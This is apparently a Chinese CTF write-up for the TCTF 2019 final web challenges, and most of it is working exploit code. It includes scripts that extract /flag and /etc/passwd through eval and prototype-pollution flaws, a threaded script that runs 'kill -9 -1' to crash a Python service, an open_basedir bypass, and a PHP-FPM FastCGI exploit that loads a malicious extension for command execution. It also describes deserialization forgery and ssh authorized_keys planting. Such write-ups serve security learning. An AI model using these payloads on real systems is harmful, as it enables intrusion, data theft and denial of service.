---
layout: post
category: TCTF 2019 final Web WP
catalog: true
excerpt: TCTF2019 final，Web 题解
time: 2019.06.11 11:35:00
tags:
- CTF
- WP

---
# TCTF-Final

很可惜，最后没有拿到第一，遗憾.

![WX20190609-160037@2x](http://momomoxiaoxi.com/img/post/tctf2019final/WX20190609-160037@2x.png)

## TCTF Hotel Booking System

中间服务器挂了，重启。但是，发现签出来的HMAC还是一样的，怀疑HMAC密钥是硬编码的。

寻找读文件利用点。

```bash
org.apache.tapestry5.internal.services.assets.ContextAssetRequestHandler#ContextAssetRequestHandler
```

目录穿越，参考http://tapestry.apache.org/assets.html#Assets-AssetSecurity

<http://localhost:8999/assets/aa/services/AppModule.class>

<http://127.0.0.1:30107/assets/app/e3d6c19d/services/AppModule.class>

读取到AppModule.class

![image-20190609135415723](/Users/moxiaoxi/Library/Application Support/typora-user-images/image-20190609135415723.png)

得到HMAC密钥后，就能伪造了。

构造一个反序列化类，进行攻击。

通过C3P0构造exp，记得要gzip压缩以及base64编码，通过debug模式获得正确的签名。



官方给的解答：

![WX20190611-114345@2x](http://momomoxiaoxi.com/img/post/tctf2019final/WX20190611-114345@2x.png)



## 114514 CALCALCALC

参考原来的题，通过json来绕过长度限制，再通过覆盖绕过str对比

```http
POST /calculate HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: http://127.0.0.1:3000
Content-Length: 65
Connection: close
Referer: http://127.0.0.1:3000/

{"isVip":true,"expression":"5-3","__proto__":{"a":"a"}}
```



通过注释符差异，构造exp，如下：

```python
import requests
import string

"""
POST /calculate HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: http://127.0.0.1:3000
Content-Length: 61
Connection: close
Referer: http://127.0.0.1:3000/

{"isVip":true,"expression":"2//(1)#?>","__proto__":{"a":"a"}}
"""

"""
POST /calculate HTTP/1.1
Host: 127.0.0.1:3000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/json
Origin: http://127.0.0.1:3000
Content-Length: 104
Connection: close
Referer: http://127.0.0.1:3000/

{"isVip":true,"expression":"2//int(ord(open('/etc/passwd').read()[0:1])==114)#?>","__proto__":{"a":"a"}}
"""
def attack(pos, s, target='http://127.0.0.1:3001'):
    session = requests.Session()

    rawBody = "{\"isVip\":true,\"expression\":\"1//int(ord(open('/flag').read()[" + str(pos) + ":" + str(
        pos + 1) + "])==" + str(ord(s)) + ")\x23?>\",\"__proto__\":{\"a\":\"a\"}}"
    headers = {"Origin": "http://127.0.0.1:3000", "Accept": "*/*",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0",
               "Connection": "close", "Referer": "http://127.0.0.1:3000/",
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json"}
    response = session.post(target + "/calculate", data=rawBody, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    if 'Asahina Mikuru' in response.content:
        return False
    return True


def main():
    flag = ''
    p = string.printable
    end = 0
    for i in range(20):
        for s in p:
            if attack(i, s):
                flag += s
                print(flag)
                break
        if flag[-1] == '}':
            print('get all!')
            end = 1
        if end:
            break
    print(flag)

main()

```

还一个思路是，python docker非常的脆弱，可以通过多进程阻塞打死python，使其重启，永远timeout。

node很容易超时，所以接下来只需要通过php来进行获得数据就可以了。

当php超时时，返回timeout。不超时时，返回Asahina Mikuru。

```python
import requests
from time import time

# url = 'https://calcalcalc.2019.rctf.rois.io/calculate'
url = 'http://localhost:3001/calculate'


def query(bool_expr):
    payload = "eval(\"if (%s){sleep(3);}\")" % bool_expr
    r = requests.post(url, json={'isVip': True, "__proto__":{"a":"a"}, 'expression': payload})
    print(payload, r.text)
    if "timeout of " in r.text:
        return True
    return False

def binary_search(geq_expression, l, r):
    eq_expression = geq_expression.replace('>=', '==')
    while True:
        if (r - l) < 4:
            for mid in range(l, r + 1):
                if query(eq_expression.format(num=mid)):
                    return mid
            else:
                print('NOT FOUND')
                return
        mid = (l + r) // 2
        if query(geq_expression.format(num=mid)):
            l = mid
        else:
            r = mid

flag_len = binary_search("strlen(file_get_contents('/flag'))>={num}", 0, 100)
# flag_len = 36
print('flag length: %d' % flag_len)

flag = ''
while len(flag) < flag_len:
    c = binary_search("ord(substr(file_get_contents('/flag'),%d,1))>={num}" % len(flag), 0, 128)
    if c:   # the bs may fail due to network issues
        flag += chr(c)
    print(flag)
```

打down python

```python
from multiprocessing.pool import ThreadPool
import requests


def down_python(target='http://127.0.0.1:3001'):
    session = requests.Session()
    rawBody = "{\"isVip\":true,\"expression\":\"__import__('os').system('kill -9 -1')\",\"__proto__\":{\"a\":\"a\"}}"
    headers = {"Origin": target, "Accept": "*/*",
               "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:67.0) Gecko/20100101 Firefox/67.0",
               "Connection": "close", "Referer": target,
               "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
               "Accept-Encoding": "gzip, deflate", "Content-Type": "application/json"}
    response = session.post(target + "/calculate", data=rawBody, headers=headers)

    # print("Status code:   %i" % response.status_code)
    # print("Response body: %s" % response.content)
    return

def ThreadPools():
    num = 20
    data = range(4000)
    print(data)
    jobs = []
    results = []
    pool = ThreadPool(num)
    for d in data:
        job = pool.apply_async(down_python, ())
        jobs.append(job)
    pool.close()
    pool.join()
    for i in jobs:
        results.append(i.get())
    print(results)

def main():
    ThreadPools()


main()
```



官方解答：

```python
# Polyglot time! – Python


open('/flag').read() + str(1//5) or ''' #
)//?>
function open(){return {read:()=>require('fs').readFileSync('/flag','utf-8')}}function str(){return 0}/*<?php
function open(){echo json_encode(['ret' => file_get_contents('/flag').'0']);exit;}?>*///'''

# returns flag{the flag}

```





## Wallbreaker (not very) Hard

扫描，存在.index.php.swp

源码：

```php
<!DOCTYPE html><html><head><style>.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}</style></head><body>
<pre class="pre"><code>Hey Brave, You should break some walls to kill the Dragon.
Break walls, kill the Dragon, Save the princess!

Wall A: Gain a webshell
Wall B: <?php echo ini_get('disable_functions') . "\n";?>
        Wall C: <?php echo ini_get('open_basedir') . "\n";?>

        Here's a backdoor, to help you break Wall A.
Backdoor: <?php eval($_POST["anfkBJbfqkfqasd"]);?>
</code></pre></body>
```



Bypass openbasedir

```http
POST /index.php HTTP/1.1
Host: 192.168.201.14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 218

anfkBJbfqkfqasd=mkdir('/tmp/fuck');chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(file_get_contents("/etc/passwd"));

```

大体思路就是通过fsock打fpm，控制其加载扩展，进行命令执行。

这个题目很奇怪，sock的名字修改了，所以得先寻找。

```http
POST /index.php HTTP/1.1
Host: 192.168.201.14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 193

anfkBJbfqkfqasd=mkdir('/tmp/fuck');chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('/run/php/'));

```

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Sun, 09 Jun 2019 04:39:55 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 1090

<!DOCTYPE html><html><head><style>.pre {word-break: break-all;max-width: 500px;white-space: pre-wrap;}</style></head><body>
<pre class="pre"><code>Hey Brave, You should break some walls to kill the Dragon.
Break walls, Kill the Dragon, Save the princess!

Wall A: Gain a webshell
Wall B: pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,putenv,proc_open,passthru,symlink,link,syslog,imap_open,dl,system,mb_send_mail,mail,error_log
Wall C: /var/www/html:/tmp

Here's a backdoor, to help you break Wall A.
But you should find the key of the backdoor.
Backdoor: array(4) {
  [0]=>
  string(1) "."
  [1]=>
  string(2) ".."
  [2]=>
  string(22) "U_wi11_nev3r_kn0w.sock"
  [3]=>
  string(14) "php7.2-fpm.pid"
}
</code></pre></body>

```



最后的exp:

```python
#!/usr/bin/env python
# coding: utf-8
import requests
import base64
import urllib
"""
POST /index.php HTTP/1.1
Host: 192.168.201.14
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 1169

anfkBJbfqkfqasd=%24fp%20%3D%20stream_socket_client%28%22unix%3A///run/php/U_wi11_nev3r_kn0w.sock%22%2C%20%24errno%2C%20%24errstr%2C30%29%3B%24out%20%3D%20urldecode%28%22%2501%2501%257EJ%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%257EJ%2501%257F%2500%2500%2509%2524PHP_VALUEauto_prepend_file%2520%253D%2520/tmp/exploit.php%250F%2517SCRIPT_FILENAME/var/www/html/index.php%250F%250ESERVER_SOFTWAREphp/fcgiclient%250B%2517SCRIPT_NAME/var/www/html/index.php%250E%2504REQUEST_METHODPOST%250F%2508SERVER_PROTOCOLHTTP/1.1%250C%2500QUERY_STRING%250B%2517REQUEST_URI/var/www/html/index.php%250E%2502CONTENT_LENGTH42%250F%2517PHP_ADMIN_VALUEextension%2520%253D%2520/tmp/ant.so%2511%250BGATEWAY_INTERFACEFastCGI/1.0%250C%2510CONTENT_TYPEapplication/text%250D%2501DOCUMENT_ROOT/%2501%2504%257EJ%2500%2500%2500%2500%2501%2505%257EJ%2500%252A%2500%2500%253C%253Fphp%2520include%2520%2522/tmp/exploit.php%2522%253B%2520exit%253B%2520%253F%253E%2501%2505%257EJ%2500%2500%2500%2500%29%3Bstream_socket_sendto%28%24fp%2C%24out%29%3Bwhile%20%28%21feof%28%24fp%29%29%20%7Becho%20htmlspecialchars%28fgets%28%24fp%2C%2010%29%29%3B%20%7Dfclose%28%24fp%29%3B





"""
session = requests.Session()
target = "http://192.168.201.14/index.php"
# target = "http://oj.momomoxiaoxi.com:8888/index.php"
headers = {"Cache-Control": "max-age=0",
           "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
           "Upgrade-Insecure-Requests": "1",
           "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.75 Safari/537.36",
           "Connection": "close", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
           "Content-Type": "application/x-www-form-urlencoded"}
proxies = {"http": "http://127.0.0.1:8080"}
userhash = '8f10f5b0ed8b32372911c55aa59344b4'


def exp(payload):
    paramsPost = {"anfkBJbfqkfqasd": payload}
    # response = session.post(target,proxies=proxies, data=paramsPost, headers=headers)
    response = session.post(target, data=paramsPost, headers=headers)
    print("Status code:   %i" % response.status_code)
    print("Response body: %s" % response.content)
    results = response.content.split('Backdoor:')[1].split('</code>')[0]
    print(results)


def put_file(filename):
    with open(filename, "rb") as f:
        data = f.read()
    content = base64.b64encode(data).decode("utf-8")
    payload = 'echo file_put_contents("/tmp/{}",base64_decode("{}"));'.format(filename, content)
    # print(payload)
    exp(payload)


def get_file(filename):
    payload = 'var_dump(file_get_contents("/tmp/{}"));'.format(filename)
    exp(payload)


def scan_dir(d):
    payload = "mkdir('/tmp/fuck');chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');var_dump(scandir('{}'));".format(
        d)
    exp(payload)


def end_payload():
    input = """%01%01%7EJ%00%08%00%00%00%01%00%00%00%00%00%00%01%04%7EJ%01%7F%00%00%09%24PHP_VALUEauto_prepend_file%20%3D%20/tmp/exploit.php%0F%17SCRIPT_FILENAME/var/www/html/index.php%0F%0ESERVER_SOFTWAREphp/fcgiclient%0B%17SCRIPT_NAME/var/www/html/index.php%0E%04REQUEST_METHODPOST%0F%08SERVER_PROTOCOLHTTP/1.1%0C%00QUERY_STRING%0B%17REQUEST_URI/var/www/html/index.php%0E%02CONTENT_LENGTH42%0F%17PHP_ADMIN_VALUEextension%20%3D%20/tmp/ant.so%11%0BGATEWAY_INTERFACEFastCGI/1.0%0C%10CONTENT_TYPEapplication/text%0D%01DOCUMENT_ROOT/%01%04%7EJ%00%00%00%00%01%05%7EJ%00%2A%00%00%3C%3Fphp%20include%20%22/tmp/exploit.php%22%3B%20exit%3B%20%3F%3E%01%05%7EJ%00%00%00%00"""
    data = """$fp = stream_socket_client("unix:///run/php/U_wi11_nev3r_kn0w.sock", $errno, $errstr,30);$out = urldecode(\""""+input+""");stream_socket_sendto($fp,$out);while (!feof($fp)) {echo htmlspecialchars(fgets($fp, 10)); }fclose($fp);"""
    # print(data)
    print(urllib.quote(data))
    exp(urllib.quote(data))

def main():
    # put_file('ant.so')
    # put_file('exploit.php')
    # scan_dir('/tmp/')
    # get_file('exploit.php')
    end_payload()


if __name__ == '__main__':
    main()

```

![WX20190609-133008@2x](http://momomoxiaoxi.com/img/post/tctf2019final/WX20190609-133008@2x.png)

使用<https://github.com/wuyunfeng/Python-FastCGI-Client>进行构造

```python
import socket
import random
import argparse
import sys
from io import BytesIO

# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client

PY2 = True if sys.version_info.major == 2 else False


def bchr(i):
    if PY2:
        return force_bytes(chr(i))
    else:
        return bytes([i])


def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)


def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')


def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self, host, port, timeout, keepalive):
        self.host = host
        self.port = port
        self.timeout = timeout
        if keepalive:
            self.keepalive = 1
        else:
            self.keepalive = 0
        self.sock = None
        self.requests = dict()

    def __connect(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(self.timeout)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        # if self.keepalive:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)
        # else:
        #     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)
        try:
            self.sock.connect((self.host, int(self.port)))
        except socket.error as msg:
            self.sock.close()
            self.sock = None
            print(repr(msg))
            return False
        return True

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
              + bchr(fcgi_type) \
              + bchr((requestid >> 8) & 0xFF) \
              + bchr(requestid & 0xFF) \
              + bchr((length >> 8) & 0xFF) \
              + bchr(length & 0xFF) \
              + bchr(0) \
              + bchr(0) \
              + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                      + bchr((nLen >> 16) & 0xFF) \
                      + bchr((nLen >> 8) & 0xFF) \
                      + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                      + bchr((vLen >> 16) & 0xFF) \
                      + bchr((vLen >> 8) & 0xFF) \
                      + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''

            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        # if not self.__connect():
        #    print('connect failure! please check your fasctcgi-server !!')
        #    return

        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
                                 + bchr(self.keepalive) \
                                 + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)
        from urllib import quote
        print(quote(request))
        exit(1)
        # self.sock.send(request)
        # self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND
        # self.requests[requestId]['response'] = b''
        return self.__waitForResponse(requestId)

    def __waitForResponse(self, requestId):
        data = b''
        while True:
            buf = self.sock.recv(512)
            if not len(buf):
                break
            data += buf

        data = BytesIO(data)
        while True:
            response = self.__decodeFastCGIRecord(data)
            if not response:
                break
            if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \
                    or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:
                    self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR
                if requestId == int(response['requestId']):
                    self.requests[requestId]['response'] += response['content']
            if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:
                self.requests[requestId]
        return self.requests[requestId]['response']

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')
    parser.add_argument('host', help='Target host, such as 127.0.0.1')
    parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')
    parser.add_argument('-c', '--code', help='What php code your want to execute', default='<?php include "/tmp/exploit.php"; exit; ?>')
    parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int)

    args = parser.parse_args()

    client = FastCGIClient(args.host, args.port, 3, 0)
    params = dict()
    documentRoot = "/"
    uri = args.file
    content = args.code
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = /tmp/exploit.php',
        'PHP_ADMIN_VALUE': 'extension = /tmp/ant.so'
    }
    response = client.request(params, content)
    print(force_text(response))
```

Exploit.php

```php
<?php
mkdir('/tmp/fuck');chdir('/tmp/fuck/');ini_set('open_basedir','..');chdir('..');chdir('..');chdir('..');chdir('..');ini_set('open_basedir','/');
echo '123';antsystem('/readflag');echo '456';
```



## Babydb

仔细阅读代码，发现可以任意文件写和任意文件读，往ssh那边写authorized_keys即可。